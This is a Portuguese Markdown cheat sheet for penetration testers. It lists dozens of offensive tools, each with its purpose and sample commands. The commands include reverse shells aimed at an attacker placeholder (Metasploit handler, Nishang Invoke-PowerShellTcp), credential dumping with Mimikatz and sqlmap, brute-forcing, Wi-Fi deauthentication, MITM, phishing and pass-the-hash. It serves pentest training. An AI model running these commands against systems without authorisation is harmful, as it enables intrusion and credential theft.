# 🛡️ Ferramentas Ofensivas de Cibersegurança

Este documento lista várias **ferramentas ofensivas** utilizadas em **testes de penetração**, incluindo a sua **finalidade**, **comandos completos** e exemplos práticos.

---

## 📌 1. Metasploit Framework
- **Finalidade:** Framework para **exploração de vulnerabilidades** em redes, sistemas e aplicações.
- **Comandos de execução:**
  ```bash
  msfconsole
  ```
  - Listar exploits disponíveis:
    ```bash
    search exploit
    ```
  - Utilizar um exploit específico:
    ```bash
    use exploit/multi/handler
    ```
  - Configurar um payload:
    ```bash
    set payload windows/meterpreter/reverse_tcp
    ```
  - Definir IP do atacante:
    ```bash
    set LHOST <IP_DO_ATACANTE>
    ```
  - Executar o ataque:
    ```bash
    exploit
    ```

---

## 📌 2. Nmap (Network Mapper)
- **Finalidade:** Scanner de **redes** para **descoberta de hosts, portas abertas e sistemas operacionais**.
- **Comandos de execução:**
  ```bash
  nmap -A -T4 <IP_ALVO>
  ```
  - Para escanear uma rede inteira:
    ```bash
    nmap -sn 192.168.1.0/24
    ```
  - Para identificar portas abertas:
    ```bash
    nmap -p- <IP_ALVO>
    ```
  - Para detectar vulnerabilidades conhecidas:
    ```bash
    nmap --script vuln <IP_ALVO>
    ```

---

## 📌 3. Gobuster
- **Finalidade:** Ferramenta rápida para **força bruta de diretórios e subdomínios** em servidores web.
- **Comandos de execução:**
  ```bash
  gobuster dir -u http://<URL_ALVO> -w /usr/share/wordlists/dirb/common.txt
  ```
  - Para procurar subdomínios:
    ```bash
    gobuster dns -d <DOMINIO_ALVO> -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt
    ```
  - Para enumerar ficheiros PHP:
    ```bash
    gobuster dir -u http://<URL_ALVO> -w /usr/share/wordlists/dirb/common.txt -x php
    ```

---

## 📌 4. Feroxbuster
- **Finalidade:** Alternativa ao **Gobuster**, com **multi-threading** e requisições **HTTP recursivas**.
- **Comandos de execução:**
  ```bash
  feroxbuster -u http://<URL_ALVO> -w /usr/share/wordlists/dirb/common.txt
  ```
  - Para definir número de threads:
    ```bash
    feroxbuster -u http://<URL_ALVO> -t 50 -w /usr/share/wordlists/dirb/common.txt
    ```
  - Para ignorar códigos HTTP específicos:
    ```bash
    feroxbuster -u http://<URL_ALVO> -w /usr/share/wordlists/dirb/common.txt -C 403,500
    ```

---

## 📌 5. SQLmap
- **Finalidade:** Testa e explora **injeções SQL** em aplicações web.
- **Comandos de execução:**
  ```bash
  sqlmap -u "http://target.com/page.php?id=1" --dbs
  ```
  - Para listar tabelas de uma base de dados específica:
    ```bash
    sqlmap -u "http://target.com/page.php?id=1" -D <NOME_DA_DB> --tables
    ```
  - Para extrair credenciais de login:
    ```bash
    sqlmap -u "http://target.com/login.php" --dump -C username,password -T users -D target_db
    ```

---

## 📌 6. TheHarvester
- **Finalidade:** Ferramenta para **recolha de informações (OSINT)**.
- **Comandos de execução:**
  ```bash
  theHarvester -d <DOMINIO_ALVO> -b all
  ```
  - Para limitar o número de resultados:
    ```bash
    theHarvester -d <DOMINIO_ALVO> -b google -l 100
    ```
  - Para exportar em CSV:
    ```bash
    theHarvester -d <DOMINIO_ALVO> -b google -f resultados.csv
    ```

---

## 📌 7. FFUF (Fast Fuzz)
- **Finalidade:** Ferramenta para **fuzzing de diretórios e parâmetros HTTP**.
- **Comandos de execução:**
  ```bash
  ffuf -u http://<URL_ALVO>/FUZZ -w /usr/share/wordlists/dirb/common.txt
  ```
  - Para testar parâmetros:
    ```bash
    ffuf -u http://<URL_ALVO>/index.php?FUZZ=test -w /usr/share/wordlists/params.txt
    ```
  - Para ignorar códigos HTTP 403:
    ```bash
    ffuf -u http://<URL_ALVO>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403
    ```

---

## 📌 8. Shodan CLI
- **Finalidade:** Pesquisa de **dispositivos vulneráveis** na Internet.
- **Comandos de execução:**
  ```bash
  shodan search "Apache/2.4.49"
  ```
  - Para encontrar câmaras IP expostas:
    ```bash
    shodan search "port:554 has_screenshot:true"
    ```
  - Para listar portas abertas de um IP:
    ```bash
    shodan host <IP_ALVO>
    ```

---

## 📌 9. Masscan
- **Finalidade:** Scanner de portas extremamente rápido.
- **Comandos de execução:**
  ```bash
  masscan -p1-65535 --rate=100000 -e eth0 <IP_ALVO>
  ```
  
---

## 📌 10. John the Ripper
- **Finalidade:** Ferramenta para **cracking de senhas** através de ataques de **força bruta** ou **dicionário**.
- **Comandos de execução:**
  ```bash
  john --wordlist=rockyou.txt hashfile
  ```
  - Para detetar automaticamente o tipo de hash:
    ```bash
    john --format=auto hashfile
    ```
  - Para exibir senhas já quebradas:
    ```bash
    john --show hashfile
    ```

---

## 📌 11. Hydra
- **Finalidade:** Ferramenta para **ataques de força bruta** contra serviços de autenticação como **SSH, FTP, HTTP, MySQL**.
- **Comandos de execução:**
  ```bash
  hydra -l admin -P rockyou.txt ssh://<IP_ALVO>
  ```
  - Para atacar um formulário de login HTTP:
    ```bash
    hydra -l admin -P rockyou.txt <IP_ALVO> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
    ```

---

## 📌 12. Aircrack-ng
- **Finalidade:** Ferramenta utilizada para **auditoria e ataque a redes Wi-Fi**, permitindo capturar pacotes e quebrar **chaves WEP e WPA/WPA2**.
- **Comandos de execução:**
  ```bash
  aircrack-ng -b <BSSID> -w rockyou.txt <ficheiro_cap>
  ```
  - Para capturar pacotes de Wi-Fi:
    ```bash
    airodump-ng wlan0mon
    ```
  - Para desautenticar dispositivos de uma rede:
    ```bash
    aireplay-ng --deauth 100 -a <BSSID> wlan0mon
    ```

---

## 📌 13. Bettercap
- **Finalidade:** Ferramenta para **ataques de Man-in-the-Middle (MITM)**, captura de tráfego e exploração de redes.
- **Comandos de execução:**
  ```bash
  bettercap -iface wlan0
  ```
  - Para realizar um ataque de sniffing:
    ```bash
    bettercap -iface eth0 -eval "net.sniff on"
    ```
  - Para capturar credenciais de login HTTP:
    ```bash
    bettercap -iface wlan0 -eval "http.proxy on"
    ```

---

## 📌 14. Mimikatz
- **Finalidade:** Ferramenta para **extração de credenciais de Windows**, incluindo **hashes de senhas, tokens e tickets Kerberos**.
- **Comandos de execução (no Windows):**
  ```cmd
  mimikatz
  ```
  - Para listar credenciais de login armazenadas na RAM:
    ```cmd
    sekurlsa::logonpasswords
    ```

---

## 📌 15. Netcat
- **Finalidade:** Ferramenta utilizada para **criação de backdoors, transferência de ficheiros e comunicação remota**.
- **Comandos de execução para criar um listener reverso:**
  ```bash
  nc -lvnp 4444
  ```
  - Para conectar a um servidor remoto:
    ```bash
    nc <IP_ALVO> 4444
    ```

---

## 📌 16. Empire
- **Finalidade:** Framework pós-exploração para **comando e controlo remoto de sistemas** comprometidos.
- **Comandos de execução:**
  ```bash
  ./empire
  ```
  - Para iniciar um listener:
    ```bash
    listeners
    ```
  - Para criar um agente de ataque:
    ```bash
    usestager windows/meterpreter/reverse_http
    set LHOST <IP_DO_ATACANTE>
    execute
    ```

---

## 📌 17. Responder
- **Finalidade:** Ferramenta utilizada para **captura de credenciais em redes Windows** explorando vulnerabilidades nos protocolos **LLMNR, NetBIOS e SMB**.
- **Comandos de execução:**
  ```bash
  python3 Responder.py -I eth0
  ```
  - Para ativar a captura de hashes NTLM:
    ```bash
    python3 Responder.py -I eth0 -wFb
    ```

---

## 📌 18. CrackMapExec (CME)
- **Finalidade:** Ferramenta para **movimentação lateral e ataques contra redes Windows**, permitindo enumeração de credenciais e execução remota.
- **Comandos de execução:**
  ```bash
  crackmapexec smb <IP_ALVO> -u <USERNAME> -p <PASSWORD>
  ```
  - Para testar credenciais contra uma rede inteira:
    ```bash
    crackmapexec smb 192.168.1.0/24 -u admin -p Password123
    ```

---

## 📌 19. LinPEAS
- **Finalidade:** Ferramenta para **enumeração de privilégios em sistemas Linux**, identificando vulnerabilidades.
- **Comandos de execução:**
  ```bash
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```

---

## 📌 20. WinPEAS
- **Finalidade:** Ferramenta semelhante ao **LinPEAS**, mas voltada para **elevação de privilégios em sistemas Windows**.
- **Comandos de execução:**
  ```cmd
  winpeas.exe
  ```

  ---

  ## 📌 21. RustScan
- **Finalidade:** Scanner de portas extremamente rápido, alternativa otimizada ao Nmap.
- **Comandos de execução:**
  ```bash
  rustscan -a <IP_ALVO>
  ```

---

## 📌 22. XSStrike
- **Finalidade:** Ferramenta para **detetar e explorar vulnerabilidades de Cross-Site Scripting (XSS)**.
- **Comandos de execução:**
  ```bash
  python3 xsstrike.py -u "http://target.com"
  ```
  - Para testar uma lista de URLs:
    ```bash
    python3 xsstrike.py -l urls.txt
    ```

---

## 📌 23. PSExec
- **Finalidade:** Execução remota de comandos em sistemas Windows, útil para pós-exploração.
- **Comandos de execução:**
  ```cmd
  psexec \<IP_ALVO> -u <USERNAME> -p <PASSWORD> cmd
  ```

---

## 📌 24. Evil-WinRM
- **Finalidade:** Ferramenta para **acesso remoto** a sistemas Windows através do protocolo WinRM.
- **Comandos de execução:**
  ```bash
  evil-winrm -i <IP_ALVO> -u <USER> -p <PASSWORD>
  ```

---

## 📌 25. Hashcat
- **Finalidade:** Cracking de hashes de senhas utilizando CPU ou GPU.
- **Comandos de execução:**
  ```bash
  hashcat -m 0 -a 0 hashfile rockyou.txt
  ```

---

## 📌 26. Nikto
- **Finalidade:** Scanner de vulnerabilidades em servidores web.
- **Comandos de execução:**
  ```bash
  nikto -h <URL_ALVO>
  ```
  - Para especificar um User-Agent:
    ```bash
    nikto -h <URL_ALVO> -useragent "Mozilla/5.0"
    ```
  - Para guardar os resultados num ficheiro:
    ```bash
    nikto -h <URL_ALVO> -o resultado.txt
    ```

---

## 📌 27. Rubeus
- **Finalidade:** Ferramenta para **ataques contra Kerberos**, incluindo Pass-the-Ticket e Kerberoasting.
- **Comandos de execução (no Windows):**
  ```cmd
  Rubeus.exe kerberoast
  ```

---

## 📌 28. Amass
- **Finalidade:** Ferramenta para **reconhecimento e enumeração de subdomínios** através de técnicas passivas e ativas.
- **Comandos de execução:**
  ```bash
  amass enum -d <DOMINIO_ALVO>
  ```
  - Para utilizar métodos passivos e ativos:
    ```bash
    amass enum -active -d <DOMINIO_ALVO>
    ```

---

## 📌 29. Fimap
- **Finalidade:** Identificação e exploração de vulnerabilidades de inclusão de ficheiros locais (LFI) e remotos (RFI).
- **Comandos de execução:**
  ```bash
  fimap -u "http://target.com/page.php?file=example"
  ```
  - Para testar múltiplas URLs:
    ```bash
    fimap -m -u "http://target.com/page.php?file=example"
    ```
    
---

## 📌 30. Sublist3r
- **Finalidade:** Enumeração de subdomínios utilizando motores de busca e DNS bruteforce.
- **Comandos de execução:**
  ```bash
  sublist3r -d <DOMINIO_ALVO>
  ```
  - Para especificar o número de threads:
    ```bash
    sublist3r -d <DOMINIO_ALVO> -t 50
    ```
  - Para exportar os resultados:
    ```bash
    sublist3r -d <DOMINIO_ALVO> -o subdomains.txt
    ```

---

## 📌 31. Wifite
- **Finalidade:** Automação de ataques contra redes Wi-Fi (WEP, WPA, WPS).
- **Comandos de execução:**
  ```bash
  wifite
  ```
  - Para ataques direcionados a WPA/WPA2:
    ```bash
    wifite --kill --wpa
    ```

---

## 📌 32. Dirb
- **Finalidade:** Scanner para **descoberta de diretórios e ficheiros escondidos** em servidores web.
- **Comandos de execução:**
  ```bash
  dirb http://<URL_ALVO>
  ```
  - Para usar um dicionário customizado:
    ```bash
    dirb http://<URL_ALVO> /usr/share/wordlists/custom_list.txt
    ```

---

## 📌 33. Maltego
- **Finalidade:** Ferramenta de **inteligência de código aberto (OSINT)** para footprinting e análise de relacionamentos.
- **Comandos de execução:**
  ```bash
  maltego
  ```

---

## 📌 1. BeEF (Browser Exploitation Framework)
- **Finalidade:** Exploração de navegadores web e ataques client-side.
- **Comando de execução:**
  ```bash
  beef-xss
  ```

---

## 📌 2. PixieWPS
- **Finalidade:** Ataques offline contra redes Wi-Fi protegidas com WPS.
- **Comando de execução:**
  ```bash
  pixiewps -e <PKE> -s <E-Hash1> -z <E-Hash2> -a <AuthKey>
  ```

---

## 📌 3. Evilginx2
- **Finalidade:** Captura de tokens de autenticação através de phishing reverso.
- **Comando de execução:**
  ```bash
  evilginx
  ```

---

## 📌 4. Zphisher
- **Finalidade:** Ataques de phishing automatizados para múltiplos alvos.
- **Comando de execução:**
  ```bash
  zphisher
  ```

---

## 📌 5. Impacket
- **Finalidade:** Ataques contra redes Windows, como pass-the-hash e SMB relay.
- **Comando de execução:**
  ```bash
  psexec.py <DOMINIO>/<USUARIO>@<IP_ALVO> -hashes <NTLM_HASH>
  ```

---

## 📌 6. BloodHound
- **Finalidade:** Análise de redes Active Directory para escalonamento de privilégios.
- **Comando de execução:**
  ```bash
  bloodhound
  ```

---

## 📌 7. Crackle
- **Finalidade:** Quebra de encriptação Bluetooth Low Energy (BLE).
- **Comando de execução:**
  ```bash
  crackle -i <CAPTURED_PACKET> -o output.txt
  ```

---

## 📌 8. Yersinia
- **Finalidade:** Ataques contra protocolos de redes locais (STP, CDP, DHCP, ARP).
- **Comando de execução:**
  ```bash
  yersinia dhcp -attack 1
  ```

---

## 📌 9. Burp Suite
- **Finalidade:** Testes de penetração web, interceptação e modificação de requisições HTTP.
- **Comando de execução:**
  ```bash
  burpsuite
  ```

---

## 📌 10. Ettercap
- **Finalidade:** Ataques MITM e captura de tráfego de rede.
- **Comando de execução:**
  ```bash
  ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
  ```

---

## 📌 11. DSHashes
- **Finalidade:** Extração de hashes de credenciais do Active Directory.
- **Comando de execução:**
  ```bash
  dshashes -u <USER> -p <PASSWORD> -d <DOMAIN>
  ```

---

## 📌 12. Mitm6
- **Finalidade:** Exploração da autoconfiguração IPv6 em redes Windows.
- **Comando de execução:**
  ```bash
  mitm6 -d <DOMAIN>
  ```

---

## 📌 13. PowerSploit
- **Finalidade:** Conjunto de scripts PowerShell para execução de código malicioso e exfiltração de dados.
- **Comando de execução:**
  ```powershell
  Invoke-Mimikatz -DumpCreds
  ```

---

## 📌 14. Nishang
- **Finalidade:** Scripts PowerShell para pós-exploração e bypass de restrições.
- **Comando de execução:**
  ```powershell
  Invoke-PowerShellTcp -Reverse -IPAddress <ATACANTE_IP> -Port 4444
  ```

---

## 📌 15. Smbexec
- **Finalidade:** Execução de comandos remotos em sistemas Windows via SMB.
- **Comando de execução:**
  ```bash
  smbexec.py -H <IP_ALVO> -u <USER> -p <PASSWORD>
  ```

---

## 📌 16. Veil Framework
- **Finalidade:** Criação de payloads indetectáveis por antivírus.
- **Comando de execução:**
  ```bash
  veil
  ```

---

## 📌 1. TruffleHog
- **Finalidade:** Encontrar credenciais expostas e chaves secretas em repositórios Git.
- **Comando de execução:**
  ```bash
  trufflehog --regex --entropy=True https://github.com/user/repo.git
  ```

---

## 📌 2. GitRob
- **Finalidade:** Analisar repositórios Git em busca de informações sensíveis.
- **Comando de execução:**
  ```bash
  gitrob -github-token <TOKEN_GITHUB>
  ```

---

## 📌 3. Gophish
- **Finalidade:** Simulação de ataques de phishing.
- **Comando de execução:**
  ```bash
  gophish
  ```

---

## 📌 4. DNSTwist
- **Finalidade:** Gerar variações de domínio para detetar typosquatting e phishing.
- **Comando de execução:**
  ```bash
  dnstwist --registered example.com
  ```

---

## 📌 5. EvilSSDP
- **Finalidade:** Explorar vulnerabilidades no protocolo SSDP.
- **Comando de execução:**
  ```bash
  python3 evilssdp.py -i eth0
  ```

---

## 📌 6. SpiderFoot
- **Finalidade:** OSINT automatizado para recolha de informações.
- **Comando de execução:**
  ```bash
  spiderfoot -l 127.0.0.1:5001
  ```

---

## 📌 7. Social-Engineer Toolkit (SET)
- **Finalidade:** Ferramenta para ataques de engenharia social.
- **Comando de execução:**
  ```bash
  setoolkit
  ```

---

## 📌 8. InSpy
- **Finalidade:** Enumeração de funcionários e tecnologias empresariais via OSINT.
- **Comando de execução:**
  ```bash
  inspy --empspy company_name
  ```

---

## 📌 9. Routersploit
- **Finalidade:** Testar vulnerabilidades em roteadores e dispositivos IoT.
- **Comando de execução:**
  ```bash
  routersploit
  ```

---

## 📌 10. Sniffglue
- **Finalidade:** Sniffer de pacotes para capturar tráfego de rede.
- **Comando de execução:**
  ```bash
  sniffglue -i eth0
  ```

---

## 📌 11. Peirates
- **Finalidade:** Testes de segurança em clusters Kubernetes.
- **Comando de execução:**
  ```bash
  peirates
  ```

---

## 📌 12. Tsunami
- **Finalidade:** Scanner de segurança para redes empresariais.
- **Comando de execução:**
  ```bash
  tsunami -ip-v4 <IP_ALVO>
  ```

---

## 📌 13. Ffuf
- **Finalidade:** Fuzzing para força bruta de diretórios e parâmetros web.
- **Comando de execução:**
  ```bash
  ffuf -u http://<URL_ALVO>/FUZZ -w /usr/share/wordlists/dirb/common.txt
  ```

---

## 📌 14. CrackMapExec
- **Finalidade:** Ataques em massa contra redes Windows.
- **Comando de execução:**
  ```bash
  crackmapexec smb <IP_ALVO> -u <USERNAME> -p <PASSWORD>
  ```

---

## 📌 15. NoSQLMap
- **Finalidade:** Testes de penetração contra bancos de dados NoSQL.
- **Comando de execução:**
  ```bash
  nosqlmap
  ```

---

## 📌 16. XRay
- **Finalidade:** Scanner automatizado para encontrar vulnerabilidades web.
- **Comando de execução:**
  ```bash
  xray webscan --url <URL_ALVO>
  ```

---

## 📌 17. GroundZero
- **Finalidade:** Enumeração de subdomínios e descoberta de infraestrutura web.
- **Comando de execução:**
  ```bash
  groundzero -d <DOMINIO_ALVO>
  ```

---

## 📌 18. RedHawk
- **Finalidade:** Scanner de informações e vulnerabilidades web.
- **Comando de execução:**
  ```bash
  php redhawk.php
  ```

---

## 📌 19. Commix
- **Finalidade:** Exploração de vulnerabilidades de injeção de comandos em aplicações web.
- **Comando de execução:**
  ```bash
  commix --url "http://target.com/page.php?id=1"
  ```

---

## 📌 20. PhoneInfoga
- **Finalidade:** OSINT para análise de números de telefone.
- **Comando de execução:**
  ```bash
  phoneinfoga scan -n "+351123456789"
  ```
